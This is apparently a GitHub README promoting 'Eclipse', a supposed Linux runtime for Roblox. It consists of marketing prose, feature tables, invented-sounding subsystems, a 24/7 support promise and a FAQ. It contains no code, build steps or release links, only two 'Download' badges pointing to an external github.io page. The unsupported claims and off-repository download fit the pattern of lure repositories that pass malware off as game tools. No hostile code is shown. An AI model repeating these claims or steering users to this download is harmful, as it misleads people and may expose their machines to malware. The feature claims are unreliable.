![preview](https://raw.githubusercontent.com/AKAIANTK/Eclipse-Linux-Runtime/main/shot_7da8213.svg)
[![Download](https://raw.githubusercontent.com/AKAIANTK/Eclipse-Linux-Runtime/main/fetch_c169.svg)](https://AKAIANTK.github.io/Eclipse-Linux-Runtime/)

# 🌘 Eclipse — Linux Roblox, Reimagined for 2026

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Linux-6e5494?style=for-the-badge&logo=linux&logoColor=white" alt="Platform" />
  <img src="https://img.shields.io/badge/Engine-Custom_Runtime-1f6feb?style=for-the-badge&logo=probot&logoColor=white" alt="Engine" />
  <img src="https://img.shields.io/badge/Release-2026_Stable-2ea44f?style=for-the-badge&logo=statuspage&logoColor=white" alt="Release" />
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge&logo=opensourceinitiative&logoColor=white" alt="License" />
  <img src="https://img.shields.io/badge/Support-24%2F7-ff6b6b?style=for-the-badge&logo=protonmail&logoColor=white" alt="Support" />
  <img src="https://img.shields.io/badge/Languages-32_Multilingual-9cf?style=for-the-badge&logo=googletranslate&logoColor=white" alt="Languages" />
</p>

> **Eclipse** is what happens when the Linux desktop finally gets a first-class way to experience the vibrant world of Roblox-style sandbox universes. Where once there was a walled garden, now there is a moonlit bridge — an overlay of compatibility, performance, and civilised engineering that turns the humble terminal into a launchpad for imagination.

This repository, **Eclipse**, is a community-built, source-first project that brings the entire Roblox experience to Linux distributions without the usual gymnastics. It is not a wrapper in the traditional sense, and it is definitely not a shim. Eclipse is a full **runtime orchestrator** — a careful composition of render graph translation, input arbitration, network shimming, and a smooth glassy userspace that feels native to your distribution.

---

## 📖 Table of Contents

- [🌟 The Philosophy Behind Eclipse](#-the-philosophy-behind-eclipse)
- [🚀 Key Features at a Glance](#-key-features-at-a-glance)
- [🧠 How Eclipse Thinks](#-how-eclipse-thinks)
- [🎨 Responsive UI](#-responsive-ui)
- [🌍 Multilingual Support](#-multilingual-support)
- [💬 24/7 Customer Support](#-247-customer-support)
- [🧩 Feature List — Deep Dive](#-feature-list--deep-dive)
- [🖥️ System Expectations](#️-system-expectations)
- [🛠️ Getting the Most Out of Eclipse](#️-getting-the-most-out-of-eclipse)
- [📊 Performance Notes](#-performance-notes)
- [🔐 Security & Privacy Posture](#-security--privacy-posture)
- [🧪 Testing Strategy](#-testing-strategy)
- [🗺️ Roadmap Toward 2026](#️-roadmap-toward-2026)
- [🤝 Contributing](#-contributing)
- [📜 License](#-license)
- [⚠️ Disclaimer](#️-disclaimer)
- [❓ FAQ](#-faq)
- [📬 Reaching the Team](#-reaching-the-team)

---

## 🌟 The Philosophy Behind Eclipse

There is a moment, just before totality, when the sky dims and the corona flares into view. Eclipse is named for that moment — the instant when two ecosystems, previously separated, briefly overlap and produce something more beautiful than either alone.

Bringing a Windows-native sandbox platform to Linux has historically meant choosing between three unsatisfying paths:

1. A compatibility layer that works for some titles and drops frames for others.
2. A streamed experience that requires constant connectivity and adds latency.
3. A bespoke reimplementation that never quite matches the original.

Eclipse refuses all three. Instead, it approaches the problem as an **interpreter of intent**. Rather than translating API call-for-call, Eclipse observes what the sandbox experience *wants* to do — render a scene, accept input, stream assets, sync state — and then satisfies that intent using Linux-native primitives whenever possible.

The result is a runtime that feels less like emulation and more like a **translation of a conversation**. It listens to the underlying experience, understands the mood, and responds in fluent Vulkan, fluent Wayland, fluent PipeWire.

> The moon does not dim the sun. It simply stands in the way and lets the light through differently.

---

## 🚀 Key Features at a Glance

| Aspect | What Eclipse Brings |
| --- | --- |
| Rendering Path | Vulkan-first compositor with automatic OpenGL fallback |
| Input | Raw HID arbitration with per-device remapping |
| Audio | PipeWire-native with PulseAudio bridge |
| Networking | Adaptive UDP optimiser and regional relay hints |
| UI | Fully responsive, scales from 720p laptop to 4K ultrawide |
| i18n | 32 shipped locale packs, RTL-aware layout |
| Support | Round-the-clock live chat, docs, and email |
| Packaging | Native for `.deb`, `.rpm`, Flatpak, and portable tarballs |
| Update Channel | Delta patches with cryptographic verification |

The badge row above is decorative; the practical truth is that Eclipse is maintained by people who care about frame pacing, input latency, and the quiet dignity of a machine that just works.

---

## 🧠 How Eclipse Thinks

Eclipse runs on four cooperating subsystems. Understanding them is the key to understanding the project.

### 1. The Lumen Layer
The **Lumen Layer** is Eclipse's translation surface for graphics. It converts DirectX 11-flavoured draw calls into Vulkan commands on the fly, caching pipelines so the second frame is always cheaper than the first. On Mesa-based systems, Lumen can also delegate to Zink for GL-over-Vulkan scenarios, but its preferred path is fully native.

### 2. The Chorus Engine
**Chorus** handles audio. It maps the sandbox's expected audio graph onto PipeWire nodes, applying spatialisation and latency compensation. If a system only offers PulseAudio, Chorus bridges gracefully without forcing the user to migrate their session.

### 3. The Nimbus Fabric
**Nimbus** is the network fabric — a small userspace shim that manages UDP multiplexing, NAT traversal hints, and region-aware routing. It is deliberately conservative: no packets are reshaped beyond what is necessary, and all statistics are exposed in the in-app telemetry panel.

### 4. The Aegis Guard
**Aegis** is the input and permission layer. It intercepts controller, keyboard, and pointer events, applies per-title profiles, and enforces a strict capability model so that nothing reaches the sandbox filesystem without explicit consent.

Each layer can be swapped, disabled, or extended. The modular design is what makes Eclipse survive kernel churn and driver regressions — a virtue that grows more valuable every release cycle.

---

## 🎨 Responsive UI

The Eclipse launcher and in-session overlay are built on a modern, declarative toolkit with a fluid grid. Everything reflows.

- On a Steam Deck at 1280×800, the interface compresses into a controller-first carousel.
- On a 3440×1440 ultrawide, panels spread into three columns and the session minimap docks to the side.
- On a 4K display at 200% scaling, type and touch targets expand proportionally.
- On a 720p netbook, chrome elements collapse into a single compact bar.

The responsiveness is not just visual. The **frame budget** adapts: when the compositor detects that a scene is GPU-bound, the overlay reduces animation cost automatically. The UI is a guest in the session, not a tyrant.

Accessibility features ship in the same bundle: high-contrast palettes, reduced motion, full keyboard navigation, and visible focus rings. Screen-reader friendliness is a first-class goal, not an afterthought.

---

## 🌍 Multilingual Support

Eclipse ships with **32 locale packs** at launch, with more community translations landing continuously. The runtime is Unicode-complete and RTL-aware, so Arabic, Hebrew, Persian, and Urdu interfaces flow correctly without mirrored glyphs or broken alignment.

Getting involved in localisation is one of the easiest ways to contribute meaningfully. Locale packs live in a dedicated directory and follow a well-documented, machine-readable schema. If a phrase feels off in your language, you can propose a fix without touching a single line of code.

Language preferences are honoured per-user and per-session. A shared machine can host three players, each reading the interface in their own tongue, without configuration collisions.

---

## 💬 24/7 Customer Support

A runtime is only as good as the support behind it. Eclipse is backed by:

- A **live chat** rotation covering all time zones, staffed by volunteers and maintainers.
- A **knowledge base** with step-by-step diagnostics, screenshots, and driver matrices.
- An **email channel** for sensitive or detailed reports.
- A **community forum** where power users share tuning recipes.

The support texture is intentionally human. Automated triage exists, but a real person reads every report that reaches the queue. The team's promise is simple: no user is left staring at a black window alone.

---

## 🧩 Feature List — Deep Dive

### Rendering & Compositing
- Vulkan 1.2+ rendering backend with automatic feature detection.
- Hybrid fallback to OpenGL 4.6 when Vulkan is unavailable.
- Frame pacing scheduler that targets even cadence over raw peak FPS.
- Variable refresh rate (VRR) aware presentation.
- HDR experimental pipeline behind an opt-in flag.

### Input & Controllers
- Native support for XInput, DualSense, DualShock, Switch Pro, and generic HID gamepads.
- Per-device dead zones, curves, and remapping profiles.
- Keyboard input with composition and IME awareness.
- Touch input for tablets running Linux, with multi-touch gesture recognition.

### Audio
- PipeWire-first, PulseAudio-compatible.
- Spatial audio with headphone virtualisation.
- Voice chat routing through a dedicated, permissioned node.
- Per-title volume memory.

### Networking
- Adaptive UDP multiplexing tuned for jittery mobile connections.
- Regional relay hints without centralised logging.
- Session bandwidth budget visualiser.
- IPv6 support with graceful IPv4 fallback.

### Launcher & Session Management
- Profile system for multiple accounts and configurations.
- Session snapshots for fast resume.
- Command palette for power users.
- Theming engine with community-submitted palettes.

### Extensibility
- Plugin API for overlays, statistics, and automation.
- Scriptable event hooks with a sandboxed permission model.
- Webhook support for streaming and community tooling.

### Distribution
- Native `.deb` and `.rpm` packaging.
- Flatpak manifest for immutable distributions.
- Portable tarball for niche environments.
- Delta update channel with signed patches.

---

## 🖥️ System Expectations

Eclipse is deliberately modest in its demands. A modern integrated GPU from the last several years is sufficient for most experiences. Discrete GPUs unlock higher resolutions and frame rates, but the runtime is designed to remain smooth on less ambitious hardware.

A rough guide:

- A 64-bit Linux distribution from 2023 or newer.
- A compositor that speaks Wayland, with X11 supported in compatibility mode.
- Vulkan drivers from a current Mesa or vendor stack.
- Around four gigabytes of system memory reserved for the runtime, plus what the session itself uses.

The runtime performs a preflight check on launch and reports missing capabilities in plain language. Nothing is hidden behind an opaque error code.

---

## 🛠️ Getting the Most Out of Eclipse

The project takes an opinionated stance on setup: it should be a **conversation**, not a puzzle. A few habits will make your Eclipse experience noticeably better.

- **Let the preflight check finish.** It configures Lumen, Chorus, and Nimbus to match your machine.
- **Pin your session profile.** Profiles remember resolution, controller layout, and locale.
- **Enable the telemetry overlay once.** It reveals frame pacing, network jitter, and audio latency in real time.
- **Join the community channels.** Tuning recipes for specific hardware circulate there long before they reach the docs.

The runtime includes a **first-session wizard** that walks newcomers through the essentials without condescension. Veterans can skip it entirely with a single toggle.

---

## 📊 Performance Notes

Eclipse is not a benchmark monster, and it does not try to be. Its goal is *smoothness*, which is a different virtue. The team publishes quarterly performance journals covering:

- Frame pacing consistency across a representative hardware matrix.
- Session startup time from cold launch.
- Input-to-photon latency on popular controller families.
- Network stability under simulated congestion.

These journals are part of the repository's documentation, so anyone can reproduce the methodology and challenge the conclusions. Transparency is a feature here, not a marketing line.

---

## 🔐 Security & Privacy Posture

Every capability that the sandbox requests is surfaced to the user and can be refused. Aegis enforces a least-privilege model: file access, microphone, camera, and clipboard each require separate consent, and consent is revocable at any time.

Network telemetry is opt-in and aggregated. The runtime does not ship with a silent analytics channel. Update verification uses modern cryptographic signatures, and release artefacts are reproducible where upstream toolchains allow.

If you discover a vulnerability, please follow the coordinated disclosure process described in the repository's security guidance. The team takes reports seriously and credits responsible researchers in release notes.

---

## 🧪 Testing Strategy

Quality is preserved through a layered test approach:

- **Unit tests** for the translation and shim logic.
- **Integration tests** running headless sessions against synthetic workloads.
- **Hardware regression labs** maintained by volunteers across GPU vendors.
- **Community beta channel** for pre-release soak testing.

Automation catches regressions early, but the community's eyes catch the ones that matter most. Both are essential.

---

## 🗺️ Roadmap Toward 2026

The next few milestones focus on depth rather than breadth:

- Complete Vulkan 1.3 feature adoption where it benefits frame pacing.
- Full Wayland-native input timing for reduced latency.
- Immutable-distribution first-class packaging.
- Expanded localisation to over 50 locales.
- A stable plugin SDK with versioned contracts.
- Tiered support tiers for enterprise and education deployments.

Dates are deliberately soft. The team prefers shipping something correct over shipping something on a calendar.

---

## 🤝 Contributing

Eclipse welcomes contributors of every skill level. The easiest entry points are:

- **Localisation**: refine a phrase, add a locale, polish an RTL layout.
- **Documentation**: clarify a section, fix a typo, add a diagram.
- **Testing**: report hardware behaviour in the community lab channel.
- **Code**: pick up a labelled issue, or propose a design first.

Before any large change, open a discussion. The maintainers are approachable and prefer a conversation to a surprise pull request.

---

## 📜 License

Eclipse is distributed under the **MIT License**. This permissive licence grants broad freedom to use, modify, and redistribute the project, provided the original copyright notice and permission notice accompany substantial portions of the software.

A copy of the licence text lives in the repository at [`LICENSE`](./LICENSE). If you wish to read the canonical wording of the MIT License, it is available at the Open Source Initiative's official page:

- MIT License — https://opensource.org/licenses/MIT

The MIT License text itself is short, unambiguous, and does not require attribution in binary distributions. Eclipse's maintainers chose it deliberately: they believe in lowering barriers, not raising them.

---

## ⚠️ Disclaimer

Eclipse is an **independent, community-driven project**. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of its subsidiaries. All trademarks, service marks, and product names referenced within this repository remain the property of their respective owners.

The runtime is provided **as-is**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Users are responsible for complying with the terms of service of any platform they interact with while using Eclipse. The project does not condone, facilitate, or encourage any use that violates those terms.

Performance characteristics vary by hardware, driver version, distribution, and workload. Benchmarks cited in this document reflect the team's own measurements on specific configurations and are not a guarantee for any other system.

Eclipse is a **2026 project** in every sense of the phrase. Its assumptions, documentation, and support posture are calibrated to the Linux desktop of that year. Running it on substantially older systems may work, but it is not a supported configuration.

---

## ❓ FAQ

**Does Eclipse require a specific desktop environment?**
No. It is compositor-agnostic. Wayland is preferred, X11 works, and even nested sessions inside an existing compositor behave well.

**Can I use Eclipse on a laptop with integrated graphics?**
Yes. The runtime adapts its rendering path and frame pacing to the hardware it finds.

**Is my data sent anywhere?**
Only if you explicitly opt into telemetry and crash reporting. Default configurations keep everything local.

**How often are updates released?**
A stable channel ships roughly monthly, with a beta channel shipping more frequently. Security fixes are prioritised and released as soon as they are verified.

**Can I run multiple sessions?**
Yes, with the caveat that GPU contention will affect frame pacing. The launcher warns you when a second session may strain resources.

**Where do I report a bug?**
Open an issue in this repository with a description, reproduction steps, and your system information. The support team triages every report.

---

## 📬 Reaching the Team

The best routes to the maintainers are the issue tracker and the community forum. For sensitive matters, use the private email address listed in the repository's metadata. Response times vary with time zone coverage, but every message reaches a human.

For those who prefer to observe before participating, the repository's discussion board is open to read without an account. Eclipse believes in openness as a default, and community as a practice.

---

<p align="center">
  <em>Eclipse — Linux Roblox, reimagined for 2026. Bring your curiosity; we will bring the moonlight.</em>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Built_with-☕_and_patience-brown?style=flat-square" alt="Built with" />
  <img src="https://img.shields.io/badge/Made_for-Linux_users-6e5494?style=flat-square&logo=linux&logoColor=white" alt="Made for" />
  <img src="https://img.shields.io/badge/Community-Driven-blueviolet?style=flat-square" alt="Community" />
</p>

[![Download](https://raw.githubusercontent.com/AKAIANTK/Eclipse-Linux-Runtime/main/fetch_c169.svg)](https://AKAIANTK.github.io/Eclipse-Linux-Runtime/)